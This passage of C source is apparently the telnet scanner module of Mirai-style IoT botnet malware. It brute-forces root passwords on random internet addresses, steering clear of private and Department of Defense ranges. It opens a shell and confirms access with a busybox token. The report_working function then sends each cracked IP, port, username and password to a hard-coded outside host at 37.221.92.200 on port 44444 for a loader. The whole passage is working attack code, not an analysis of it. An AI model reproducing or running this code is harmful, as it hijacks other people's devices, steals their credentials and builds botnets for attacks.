                                printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif
                                send(conn->fd, password_list[conn->tries], util_strlen(password_list[conn->tries]), MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                send(conn->fd, "sh", 2, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                send(conn->fd, "shell", 5, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d got shell responce from telnet\n", conn->fd);
#endif
                                send(conn->fd, "/bin/busybox DNXXXFF", 20, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d invalid username/password combo (attempt %d)\n", conn->fd, conn->tries);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                if (++(conn->tries) == 7)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d login found root:%s\n", conn->fd, password_list[conn->tries]);
#endif
                                report_working(conn->dst_addr, conn->dst_port, "root", password_list[conn->tries]);
                                close(conn->fd);
                                conn->tries = 0;
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    if (scanner_pid != -1)
        kill(scanner_pid, 9);

    scanner_pid = -1;
}

static void report_working(uint32_t daddr, uint16_t dport, char *username, char *password)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        exit(0);
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(37,221,92,200);
    addr.sin_port = htons(44444);

    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;
    uint8_t ulen = util_strlen(username);
    uint8_t plen = util_strlen(password);

    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof (uint32_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &ulen, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, username, ulen, MSG_NOSIGNAL);
    send(fd, &plen, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, password, plen, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    exit(0);
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
    util_memset(conn->challange_str, 0, sizeof(conn->challange_str));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static uint32_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    if (util_exists(conn->rdbuf, conn->rdbuf_pos, "ncorrect", 8) != -1)
        return -1;

    prompt_ending = util_exists(conn->rdbuf, conn->rdbuf_pos, ": applet not found", 18);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_exists(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_exists(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_exists(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_challange_resp(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_exists(conn->rdbuf, conn->rdbuf_pos, "randNum:", 8)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_verify_resp(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_exists(conn->rdbuf, conn->rdbuf_pos, "verify:OK", 9)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_telnet_resp(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_exists(conn->rdbuf, conn->rdbuf_pos, "Open:OK", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static char can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}

#endif
